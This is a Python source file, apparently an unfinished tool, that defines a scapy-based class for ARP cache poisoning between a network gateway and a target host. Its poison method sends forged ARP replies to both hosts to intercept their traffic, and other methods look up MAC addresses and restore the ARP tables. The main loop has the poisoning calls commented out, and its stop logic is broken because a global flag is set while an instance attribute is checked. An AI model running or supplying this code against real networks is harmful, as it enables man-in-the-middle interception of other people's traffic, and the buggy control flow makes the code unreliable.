from scapy.all import *
import os
import threading
import time

from scapy.layers.l2 import ARP, Ether


class ArpPoisonVial(threading.Thread):
    stop = False

    def __init__(self, g_ip, t_ip, g_mac, t_mac):
        self.gateway_ip = g_ip
        self.target_ip = t_ip
        self.gateway_mac = g_mac
        self.target_mac = t_mac
        threading.Thread.__init__(self)

    def poison(self):
        # Send ARP reply with false IP and MAC address information
        send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip))
        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip))

    def restore_network(self):
        # Send ARP reply with correct IP and MAC addresses to affected targets
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip), count=5)
        # Disable IP forwarding
        os.system("sysctl -w net.ipv4.ip_forward=0")

    @staticmethod
    def get_mac(ip):
        resp, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip))
        for s, r in resp:
            return r[ARP].hwsrc
        return None

    @staticmethod
    def stop_poison():
        global stop
        stop = True

    def start(self):
        # requires elevated privileges
        # os.system("sysctl -w net.ipv4.ip_forward=1")
        global stop
        stop = False
        while not self.stop:
            # self.poison()
            # TODO: make sleep time configurable
            time.sleep(2)
            print('do me an poison')
            print(f"stop flag value: {self.stop}")
        # self.restore_network()
